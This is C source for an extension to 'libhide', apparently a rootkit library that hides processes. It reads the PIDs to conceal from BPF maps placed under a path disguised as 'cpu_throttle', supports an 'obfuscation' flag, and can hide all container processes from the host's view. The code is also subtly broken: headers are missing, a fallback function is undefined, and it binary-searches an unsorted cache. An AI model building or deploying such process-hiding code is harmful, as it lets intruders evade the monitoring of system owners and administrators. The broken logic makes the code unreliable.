/* =====================================================
 *  Dynamic BPF Map Integration for libhide.c
 *  Thay thế hardcoded PIDs bằng real-time BPF map reading
 * ===================================================== */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

/* BPF map paths */
#define BPF_MAP_PATH "/sys/fs/bpf/cpu_throttle/hidden_pid_map"
#define BPF_OBFUSCATION_PATH "/sys/fs/bpf/cpu_throttle/obfuscation_flag_map"
#define BPF_AUTO_CONTAINER_PATH "/sys/fs/bpf/cpu_throttle/auto_container_hide_map"

/* Cache structure for performance */
struct pid_cache {
    int *hidden_pids;
    size_t count;
    size_t capacity;
    time_t last_update;
    int map_fd;
    bool obfuscation_enabled;
    bool auto_container_enabled;
};

static struct pid_cache cache = {0};
static pthread_mutex_t cache_mutex = PTHREAD_MUTEX_INITIALIZER;

/* Initialize BPF map connection */
static int init_bpf_maps(void) {
    /* Open hidden PID map */
    cache.map_fd = bpf_obj_get(BPF_MAP_PATH);
    if (cache.map_fd < 0) {
        /* Map not available - fall back to userspace-only mode */
        fprintf(stderr, "BPF map not available, using fallback mode\n");
        return -1;
    }
    
    /* Initialize cache */
    cache.capacity = 1024;
    cache.hidden_pids = malloc(cache.capacity * sizeof(int));
    if (!cache.hidden_pids) {
        close(cache.map_fd);
        return -1;
    }
    
    cache.count = 0;
    cache.last_update = 0;
    
    return 0;
}

/* Read obfuscation flag from BPF map */
static bool read_obfuscation_flag(void) {
    int obf_fd = bpf_obj_get(BPF_OBFUSCATION_PATH);
    if (obf_fd < 0) {
        return true;  /* Default: enabled */
    }
    
    uint32_t key = 0;
    uint32_t value = 0;
    
    if (bpf_map_lookup_elem(obf_fd, &key, &value) == 0) {
        close(obf_fd);
        return value == 1;
    }
    
    close(obf_fd);
    return true;  /* Default: enabled */
}

/* Read auto container detection flag */
static bool read_auto_container_flag(void) {
    int auto_fd = bpf_obj_get(BPF_AUTO_CONTAINER_PATH);
    if (auto_fd < 0) {
        return false;  /* Default: disabled */
    }
    
    uint32_t key = 0;
    uint32_t value = 0;
    
    if (bpf_map_lookup_elem(auto_fd, &key, &value) == 0) {
        close(auto_fd);
        return value == 1;
    }
    
    close(auto_fd);
    return false;  /* Default: disabled */
}

/* Update cache from BPF map */
static int update_pid_cache(void) {
    time_t now = time(NULL);
    
    /* Update every 5 seconds to balance performance and freshness */
    if (now - cache.last_update < 5) {
        return 0;
    }
    
    if (cache.map_fd < 0) {
        /* Try to reconnect */
        if (init_bpf_maps() != 0) {
            return -1;
        }
    }
    
    /* Read all entries from BPF map */
    uint32_t key = 0;
    uint32_t next_key;
    uint32_t value;
    size_t new_count = 0;
    
    /* First pass: count entries */
    while (bpf_map_get_next_key(cache.map_fd, &key, &next_key) == 0) {
        if (bpf_map_lookup_elem(cache.map_fd, &next_key, &value) == 0 && value == 1) {
            new_count++;
        }
        key = next_key;
    }
    
    /* Resize cache if needed */
    if (new_count > cache.capacity) {
        cache.capacity = new_count * 2;
        int *new_pids = realloc(cache.hidden_pids, cache.capacity * sizeof(int));
        if (!new_pids) {
            return -1;
        }
        cache.hidden_pids = new_pids;
    }
    
    /* Second pass: populate cache */
    cache.count = 0;
    key = 0;
    while (bpf_map_get_next_key(cache.map_fd, &key, &next_key) == 0) {
        if (bpf_map_lookup_elem(cache.map_fd, &next_key, &value) == 0 && value == 1) {
            cache.hidden_pids[cache.count++] = next_key;
        }
        key = next_key;
    }
    
    /* Update flags */
    cache.obfuscation_enabled = read_obfuscation_flag();
    cache.auto_container_enabled = read_auto_container_flag();
    
    cache.last_update = now;
    return 0;
}

/* Thread-safe PID lookup */
static bool is_hidden_pid_dynamic(int pid) {
    pthread_mutex_lock(&cache_mutex);
    
    /* Update cache if needed */
    if (update_pid_cache() != 0) {
        pthread_mutex_unlock(&cache_mutex);
        /* Fallback to static list if BPF map unavailable */
        return is_hidden_pid_static(pid);
    }
    
    /* Binary search for better performance */
    int left = 0;
    int right = cache.count - 1;
    bool found = false;
    
    while (left <= right) {
        int mid = left + (right - left) / 2;
        if (cache.hidden_pids[mid] == pid) {
            found = true;
            break;
        } else if (cache.hidden_pids[mid] < pid) {
            left = mid + 1;
        } else {
            right = mid - 1;
        }
    }
    
    pthread_mutex_unlock(&cache_mutex);
    return found;
}

/* Enhanced container detection */
static bool is_container_process_dynamic(int pid) {
    if (!cache.auto_container_enabled) {
        return false;
    }
    
    /* Check if process is in container namespace */
    char ns_path[256];
    char host_ns[256];
    char proc_ns[256];
    
    /* Read host PID namespace */
    if (readlink("/proc/1/ns/pid", host_ns, sizeof(host_ns) - 1) < 0) {
        return false;
    }
    
    /* Read process PID namespace */
    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/pid", pid);
    if (readlink(ns_path, proc_ns, sizeof(proc_ns) - 1) < 0) {
        return false;
    }
    
    /* Different namespaces indicate container */
    return strcmp(host_ns, proc_ns) != 0;
}

/* Enhanced is_hidden_pid function */
bool is_hidden_pid_enhanced(int pid) {
    /* Check explicit hidden list */
    if (is_hidden_pid_dynamic(pid)) {
        return true;
    }
    
    /* Check container auto-detection */
    if (is_container_process_dynamic(pid)) {
        return true;
    }
    
    return false;
}

/* Error handling and logging */
static void log_bpf_error(const char* operation, int error) {
    char error_msg[256];
    snprintf(error_msg, sizeof(error_msg), 
             "BPF %s failed: %s (errno: %d)", 
             operation, strerror(abs(error)), abs(error));
    
    /* Log to syslog */
    syslog(LOG_WARNING, "libhide: %s", error_msg);
    
    /* Also log to stderr in debug mode */
    if (getenv("LIBHIDE_DEBUG")) {
        fprintf(stderr, "libhide: %s\n", error_msg);
    }
}

/* Cleanup function */
static void cleanup_bpf_integration(void) {
    pthread_mutex_lock(&cache_mutex);
    
    if (cache.map_fd >= 0) {
        close(cache.map_fd);
        cache.map_fd = -1;
    }
    
    if (cache.hidden_pids) {
        free(cache.hidden_pids);
        cache.hidden_pids = NULL;
    }
    
    cache.count = 0;
    cache.capacity = 0;
    
    pthread_mutex_unlock(&cache_mutex);
}

/* Enhanced initialization */
void init_libhide_enhanced(void) {
    /* Initialize BPF integration */
    if (init_bpf_maps() != 0) {
        log_bpf_error("initialization", errno);
        /* Continue with fallback mode */
    }
    
    /* Set up cleanup handler */
    atexit(cleanup_bpf_integration);
    
    /* Initial cache update */
    pthread_mutex_lock(&cache_mutex);
    update_pid_cache();
    pthread_mutex_unlock(&cache_mutex);
    
    syslog(LOG_INFO, "libhide enhanced initialization complete");
}

/* Statistics and monitoring */
void print_cache_stats(void) {
    pthread_mutex_lock(&cache_mutex);
    
    printf("=== BPF Integration Statistics ===\n");
    printf("Hidden PIDs in cache: %zu\n", cache.count);
    printf("Cache capacity: %zu\n", cache.capacity);
    printf("Last update: %ld seconds ago\n", time(NULL) - cache.last_update);
    printf("Obfuscation enabled: %s\n", cache.obfuscation_enabled ? "Yes" : "No");
    printf("Auto container detection: %s\n", cache.auto_container_enabled ? "Yes" : "No");
    printf("BPF map FD: %d\n", cache.map_fd);
    
    if (cache.count > 0) {
        printf("Hidden PIDs: ");
        for (size_t i = 0; i < cache.count && i < 10; i++) {
            printf("%d ", cache.hidden_pids[i]);
        }
        if (cache.count > 10) {
            printf("... (%zu more)", cache.count - 10);
        }
        printf("\n");
    }
    
    printf("==================================\n");
    
    pthread_mutex_unlock(&cache_mutex);
}
